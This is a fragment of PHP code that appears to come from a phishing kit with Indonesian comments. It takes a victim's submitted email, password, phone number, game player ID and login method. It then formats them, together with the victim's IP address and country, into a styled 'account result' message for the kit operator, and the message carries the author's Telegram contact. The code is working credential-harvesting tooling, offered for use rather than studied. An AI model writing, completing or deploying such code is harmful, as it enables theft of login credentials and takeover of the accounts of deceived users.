...
if($email == "" && $password == "" && $dialcode == "" && $playid == "" && $phone == "" && $login == ""){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN
$subjek = "$lazaruz_flag | $lazaruz_callingcode | PUNYA SI $email | LOGIN $login | IP : $lazaruz_ip_address";
$pesan = '
<center>
<div style="background: url(https://i.ibb.co/Kzj5NHL/bannerlaza.png) no-repeat center center; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
...
<a style="background-image: linear-gradient(#179CDE, #0088CC); width: 55%; margin-top: 10px; margin-left: auto; margin-right: auto; padding: 6px; color: #fff; font-size: 15px; text-align: center; text-transform: uppercase; text-decoration: none; border-radius: 3px; outline: none; display: block;" href="https://t.me/lazaruzs">Find Me on Telegram</a>
</div>
</center>
';
